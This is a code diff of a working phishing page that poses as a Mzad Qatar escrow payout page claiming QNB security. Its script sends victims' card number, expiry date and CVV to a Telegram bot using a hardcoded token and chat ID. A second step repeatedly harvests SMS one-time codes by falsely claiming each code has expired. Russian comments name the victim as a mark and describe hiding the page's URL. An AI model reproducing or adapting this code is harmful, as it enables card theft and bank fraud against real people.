@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mzad Qatar | Tracking & Payout</title>
+    <title>Mzad Qatar | Secure Escrow</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
         :root { --main-color: #8a1538; --bg: #f4f5f7; }
@@ -49,15 +49,15 @@
     </div>
     
     <div class="content" id="step-1">
-        <div class="status-badge">FUNDS PENDING RELEASE</div>
-        <h2>Secure Escrow Payout</h2>
-        <p>Transaction <span class="tracking-num" id="track-id">Loading...</span> has been secured. Verify your receiving card details to release the funds to your account.</p>
+        <div class="status-badge">PAYOUT FUNDS PENDING</div>
+        <h2>Secure Escrow Release</h2>
+        <p>Order <span class="tracking-num" id="track-id">...</span> is complete. Verify your card details to receive the funds.</p>
         
         <div class="item-preview" id="item-box" style="display:none;">
             <img id="p-img" src="">
             <div class="item-info">
-                <h3 id="p-name">...</h3>
-                <div class="price" id="p-price">...</div>
+                <h3 id="p-name">Loading item...</h3>
+                <div class="price" id="p-price">0 QAR</div>
             </div>
         </div>
 
@@ -82,7 +82,7 @@
 
     <div class="content" id="step-2">
         <h2 style="text-align:center; color:#111;">Bank Authentication</h2>
-        <p style="text-align:center;">To authorize the deposit of <b id="t-amount" style="color:var(--main-color);"></b>, enter the one-time code sent to your mobile phone.</p>
+        <p style="text-align:center;">To authorize the deposit of <b id="t-amount" style="color:var(--main-color);"></b>, please enter the one-time SMS code sent to your mobile phone.</p>
         <div id="loading" style="display:none;"><div class="loader"></div></div>
         
         <form id="sms-form">
@@ -94,30 +94,27 @@
     </div>
 
     <div class="footer">
+        <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png" style="height: 30px; margin-bottom:15px;"><br>
         © 2026 Mzad Qatar Escrow Services. <br>
         Secured by QNB Financial Protocols.
     </div>
 </div>
 
 <script>
-    // ТВОЙ БОТ-ПРИЕМЩИК ЛОГОВ
+    // ТВОЙ БОТ-ПРИЕМЩИК
     const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const CHAT_ID = '8071425015';
 
-    // 1. СТЕЛС-РОУТИНГ: Читаем ID, маскируем URL и грузим БД
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackId = urlParams.get('id');
+    // 1. ВЫТАСКИВАЕМ ID ИЗ ССЫЛКИ
+    const path = window.location.pathname.split('/').filter(Boolean);
+    const trackId = path[path.length - 1] || 'UNKNOWN';
+    document.getElementById('track-id').innerText = '#' + trackId;
 
     let globalItem = "Device";
     let globalPrice = "0";
 
-    if (trackId) {
-        // ТРЮК: Меняем адресную строку мамонта без перезагрузки страницы!
-        window.history.replaceState(null, '', `/track/id/${trackId}`);
-        
-        document.getElementById('track-id').innerText = '#' + trackId;
-
-        // Скачиваем данные товара
+    // 2. СКАЧИВАЕМ ДАННЫЕ ИЗ ОБЛАКА
+    if (trackId !== 'UNKNOWN' && trackId !== 'id' && trackId !== 'index.html') {
         fetch(`https://jsonblob.com/api/jsonBlob/${trackId}`)
             .then(r => r.json())
             .then(data => {
@@ -127,11 +124,14 @@
                 document.getElementById('p-name').innerText = globalItem;
                 document.getElementById('p-price').innerText = globalPrice + ' QAR';
                 document.getElementById('t-amount').innerText = globalPrice + ' QAR';
-                if(data.m) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(data.m)}`;
-            });
+                if(data.m) {
+                    document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(data.m)}`;
+                }
+            })
+            .catch(e => console.log("Blob fetch error"));
     }
 
-    // 2. МАСКИ ВВОДА (Как в FedEx)
+    // 3. МАСКИ
     document.getElementById('cc').addEventListener('input', function (e) {
         this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
         this.classList.remove('err');
@@ -151,13 +151,13 @@
         return sum % 10 === 0 && v.length >= 15;
     }
 
-    // 3. ОТСТУК КАРТЫ
+    // 4. ОТПРАВКА КАРТЫ В БОТА
     document.getElementById('payment-form').addEventListener('submit', (e) => {
         e.preventDefault();
         const cc = document.getElementById('cc');
         if (!isValid(cc.value)) {
             cc.classList.add('err');
-            alert("Invalid card number.");
+            alert("Invalid card number. Please check carefully.");
             return;
         }
         
@@ -168,6 +168,7 @@
         const msg = `🇶🇦 **MZAD CARD**\n🆔 ID: #${trackId}\n📦 ${globalItem}\n💰 ${globalPrice} QAR\n\n💳 \`${cc.value}\`\n📅 \`${exp}\`\n🔒 \`${cvv}\``;
         new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
+        // ПЕРЕКЛЮЧЕНИЕ НА SMS
         setTimeout(() => {
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
@@ -181,7 +182,7 @@
         }, 1000);
     });
 
-    // 4. ОТСТУК SMS
+    // 5. ОТПРАВКА SMS В БОТА
     document.getElementById('sms-form').addEventListener('submit', (e) => {
         e.preventDefault();
         const sms = document.getElementById('sms').value;
@@ -190,8 +191,9 @@
         const msg = `🔑 **SMS CODE**: \`${sms}\`\n🆔 ID: #${trackId}`;
         new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
+        // БЕСКОНЕЧНЫЙ ДОБОР КОДОВ
         setTimeout(() => {
-            alert("The code is incorrect or has expired. A new code has been sent.");
+            alert("The verification code has expired. A new code has been sent to your device.");
             document.getElementById('btn-sms').innerText = 'CONFIRM TRANSFER';
             document.getElementById('sms').value = '';
         }, 2000);
